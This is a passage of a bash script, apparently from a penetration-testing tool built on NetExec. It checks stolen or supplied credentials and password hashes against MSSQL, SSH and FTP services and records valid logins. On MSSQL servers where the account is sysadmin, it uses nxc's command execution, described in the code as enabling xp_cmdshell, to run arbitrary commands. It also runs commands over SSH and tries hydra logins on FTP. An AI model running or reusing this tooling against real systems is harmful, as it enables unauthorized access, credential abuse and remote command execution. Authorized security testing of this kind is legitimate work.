# ── MSSQL ──────────────────────────────────────────────────────────────────────
test_mssql() {
    local ip="$1" port="$2" user="$3" cred="$4" is_hash="$5"
    local af; af=$(nxc_auth "$user" "$cred" "$is_hash")
    local pf; pf=$(nxc_port 1433 "$port")
    local label="MSSQL:${port}"

    lprint "\n  ${STEP} ${BOLD}${label}${NC}"

    # Auth check
    _run "${NXC} mssql ${ip} ${pf} ${af}" "$TIMEOUT" || true

    if echo "$LAST_OUT" | grep -q "\[+\]"; then
        local is_sysadmin="no"

        # Check sysadmin role
        _run "${NXC} mssql ${ip} ${pf} ${af} -q \"SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin') AS is_sa\"" "$TIMEOUT" || true

        if echo "$LAST_OUT" | grep -qi "1$\|sysadmin\|Pwn3d!"; then
            is_sysadmin="sysadmin"
            p_hit "${label} — ${user}@${ip} — ${LG}SYSADMIN${NC}"
            record_hit "$ip" "mssql" "$port" "$user" "$cred" "$is_hash" "$is_sysadmin"

            # Enable xp_cmdshell and exec
            p_info "Enabling xp_cmdshell..."
            local ia; ia=$(imp_auth "$user" "$cred" "$is_hash" "$ip")
            p_cmd_display "# Interactive: $(imp mssqlclient) ${ia} -windows-auth"
            p_cmd_display "${NXC} mssql ${ip} ${pf} ${af} -x '${EXEC_CMD}'"
            _run "${NXC} mssql ${ip} ${pf} ${af} -x '${EXEC_CMD}'" "$TIMEOUT" || true
            return 0
        else
            lprint "  ${AUTH} ${label} — ${user}@${ip} — auth valid (not sysadmin)"
            record_auth_only "$ip" "mssql" "$port" "$user" "$cred"
            return 2
        fi
    else
        analyze_error "mssql" "$LAST_OUT" "$ip" "$user"
        return 1
    fi
}

# ── SSH ────────────────────────────────────────────────────────────────────────
test_ssh() {
    local ip="$1" port="$2" user="$3" cred="$4" is_hash="$5"

    # SSH does not support pass-the-hash
    if [[ "$is_hash" == "1" ]]; then
        lprint "  ${DIM}[SSH:${port}] Skipped — SSH does not support pass-the-hash${NC}"
        return 1
    fi

    local pf; pf=$(nxc_port 22 "$port")
    local label="SSH:${port}"

    lprint "\n  ${STEP} ${BOLD}${label}${NC}"

    local exec_cmd="$EXEC_CMD"
    $LINUX_MODE && exec_cmd="id && whoami && hostname && uname -a"

    _run "${NXC} ssh ${ip} ${pf} -u '${user}' -p '${cred}' -x '${exec_cmd}'" "$TIMEOUT" || true

    if echo "$LAST_OUT" | grep -qi "\[+\].*Success\|Linux - Shell\|Windows - Powershell"; then
        local is_root="no"
        echo "$LAST_OUT" | grep -qi "root\|NT AUTHORITY.SYSTEM" && is_root="root"
        p_hit "${label} — ${user}@${ip}$([ "$is_root" = "root" ] && echo " — ${LR}ROOT/SYSTEM${NC}")"
        record_hit "$ip" "ssh" "$port" "$user" "$cred" "$is_hash" "$is_root"
        p_cmd_display "# Interactive: ssh '${user}'@${ip} -p ${port}"
        return 0

    elif echo "$LAST_OUT" | grep -q "\[+\]"; then
        lprint "  ${AUTH} ${label} — ${user}@${ip} — auth valid"
        record_auth_only "$ip" "ssh" "$port" "$user" "$cred"
        return 2
    else
        analyze_error "ssh" "$LAST_OUT" "$ip" "$user"
        return 1
    fi
}

# ── FTP ────────────────────────────────────────────────────────────────────────
test_ftp() {
    local ip="$1" port="$2" user="$3" cred="$4" is_hash="$5"

    if [[ "$is_hash" == "1" ]]; then
        lprint "  ${DIM}[FTP:${port}] Skipped — FTP does not support pass-the-hash${NC}"
        return 1
    fi

    local label="FTP:${port}"
    lprint "\n  ${STEP} ${BOLD}${label}${NC}"

    # Try nxc ftp first
    local pf; pf=$(nxc_port 21 "$port")
    _run "${NXC} ftp ${ip} ${pf} -u '${user}' -p '${cred}'" "$TIMEOUT" || true

    if echo "$LAST_OUT" | grep -q "\[+\]"; then
        p_hit "${label} — ${user}@${ip} — ${LG}FTP ACCESS${NC}"
        record_hit "$ip" "ftp" "$port" "$user" "$cred" "$is_hash" "no"
        p_cmd_display "# Interactive: ftp ${ip} ${port}"
        return 0
    fi

    # Fallback: hydra
    if tool_exists hydra; then
        _run "hydra -l '${user}' -p '${cred}' -s ${port} ${ip} ftp -t 1 2>/dev/null" "$TIMEOUT" || true
        if echo "$LAST_OUT" | grep -qi "login.*password\|host:.*login:"; then
            p_hit "${label} — ${user}@${ip} — ${LG}FTP ACCESS (hydra)${NC}"
            record_hit "$ip" "ftp" "$port" "$user" "$cred" "$is_hash" "no"
            return 0
        fi
    fi

    analyze_error "ftp" "$LAST_OUT" "$ip" "$user"
    return 1
}

